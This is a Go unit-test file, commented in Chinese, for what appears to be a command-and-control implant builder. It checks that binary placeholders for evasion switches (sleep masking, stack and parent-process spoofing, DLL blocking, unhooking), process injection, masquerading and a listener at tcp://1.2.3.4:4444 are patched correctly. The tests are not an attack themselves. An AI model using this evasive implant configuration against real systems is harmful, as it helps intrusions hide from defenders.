package delivery

import (
	"strings"
	"testing"
)

// newSwitchPayload 造一个含"必填占位符 + 5 个新开关占位符"的假二进制。
//
// 必填那些（LISTENER_MASTER_KEY / HOST / PASS…）是 PatchClientBinary 里强制替换、
// 缺失即报错的项——不带上它们，函数会在走到 OPSEC 段之前就返回错误。
func newSwitchPayload() []byte {
	var bin []byte
	for _, ph := range []string{
		"LISTENER_MASTER_KEY_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
		"LISTENER_SALT_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
		"RECONNECT_BASE_DELAY_PLACEHOLDER_12345",
		"RECONNECT_MAX_RETRIES_PLACEHOLDER_12345",
		"INJECT_TECH_DEFAULT_PLACEHOLDER_12345",
		"MASQUERADE_NAME_PLACEHOLDER_12345",
		"QUIET_MODE_PLACEHOLDER_12345",
		"HOSTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
		"PASSAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
		"HEARTBEAT_INTERVAL_PLACEHOLDER_12345",
		"SLEEP_MASK_HIDE_PLACEHOLDER_12345",
		"STACK_SPOOF_PLACEHOLDER_12345",
		"PPID_SPOOF_PLACEHOLDER_12345",
		"BLOCK_DLLS_PLACEHOLDER_12345",
		"UNHOOK_ON_START_PLACEHOLDER_12345",
	} {
		bin = append(bin, []byte(ph)...)
	}
	return append(bin, []byte(strings.Repeat("Z", 256))...)
}

// TestPatchOPSECSwitchesAllReplaced 五个新占位符必须全部被替换掉。
//
// 不替换的后果不是"功能没开"，而是占位符残留 → 客户端 VerifyNoPlaceholderResidue
// fail-closed 直接拒绝启动（载荷完全不可用）。
func TestPatchOPSECSwitchesAllReplaced(t *testing.T) {
	out, err := PatchClientBinary(newSwitchPayload(), PatchOptions{
		ListenerConfig:      "tcp://1.2.3.4:4444",
		OS:                  "windows",
		Arch:                "amd64",
		VKey:                "0123456789abcdef0123456789abcdef",
		EncryptSalt:         "0123456789abcdef",
		JitterPercent:       "20",
		ReconnectBaseDelay:  "3",
		ReconnectMaxRetries: "30",
		InjectTechDefault:   "ntc",
		MasqueradeName:      "winx",
		QuietMode:           "1",
		SleepMaskHide:       "1",
		StackSpoof:          "1",
		BlockDLLs:           "1",
		UnhookOnStart:       "1",
		PpidSpoof:           "0",
	})
	if err != nil {
		t.Fatalf("patch err: %v", err)
	}
	s := string(out)
	for _, ph := range []string{
		"SLEEP_MASK_HIDE_PLACEHOLDER",
		"STACK_SPOOF_PLACEHOLDER",
		"PPID_SPOOF_PLACEHOLDER",
		"BLOCK_DLLS_PLACEHOLDER",
		"UNHOOK_ON_START_PLACEHOLDER",
	} {
		if strings.Contains(s, ph) {
			t.Fatalf("占位符未替换: %s", ph)
		}
	}
}

// TestPatchOPSECSwitchesEmptyUsesDefault 空值必须回落成 "0"（不是留空格、更不是留占位符）。
//
// 客户端判定是 TrimSpace(v)=="1"，回落成空格与回落成 "0" 行为一致；
// 但状态表会打"运行期覆盖/编译期"两列，留空会让操作员分不清默认值来源。
func TestPatchOPSECSwitchesEmptyUsesDefault(t *testing.T) {
	out, err := PatchClientBinary(newSwitchPayload(), PatchOptions{
		ListenerConfig:      "tcp://1.2.3.4:4444",
		OS:                  "windows",
		Arch:                "amd64",
		VKey:                "0123456789abcdef0123456789abcdef",
		EncryptSalt:         "0123456789abcdef",
		JitterPercent:       "20",
		ReconnectBaseDelay:  "3",
		ReconnectMaxRetries: "30",
		InjectTechDefault:   "ntc",
		MasqueradeName:      "winx",
		QuietMode:           "1",
	})
	if err != nil {
		t.Fatalf("patch err: %v", err)
	}
	s := string(out)
	// 五个位置都应该是 "0" 打头（padRight 补空格），且不能残留占位符前缀。
	for _, prefix := range []string{"SLEEP_MASK_HIDE_", "STACK_SPOOF_", "PPID_SPOOF_", "BLOCK_DLLS_", "UNHOOK_ON_START_"} {
		if strings.Contains(s, prefix) {
			t.Fatalf("残留占位符前缀: %s", prefix)
		}
	}
	if n := strings.Count(s, "0 "+strings.Repeat(" ", 8)); n == 0 {
		// 只作为弱提示，不作硬断言（"0" 后面跟多少空格取决于占位符长度）
		t.Logf("未见明显的 '0 ' 填充，样本长度=%d", len(s))
	}
}

// TestPatchOPSECSwitchTooLong 超长取值必须报错（占位符是等长替换，超长只能拒绝）。
func TestPatchOPSECSwitchTooLong(t *testing.T) {
	_, err := PatchClientBinary(newSwitchPayload(), PatchOptions{
		ListenerConfig: "tcp://1.2.3.4:4444",
		OS:             "windows",
		Arch:           "amd64",
		VKey:           "0123456789abcdef0123456789abcdef",
		EncryptSalt:    "0123456789abcdef",
		SleepMaskHide:  strings.Repeat("1", 64),
	})
	if err == nil {
		t.Fatal("超长 OPSEC 取值应报错")
	}
	if !strings.Contains(err.Error(), "超长") {
		t.Fatalf("错误文案 = %q，期望含'超长'", err.Error())
	}
}
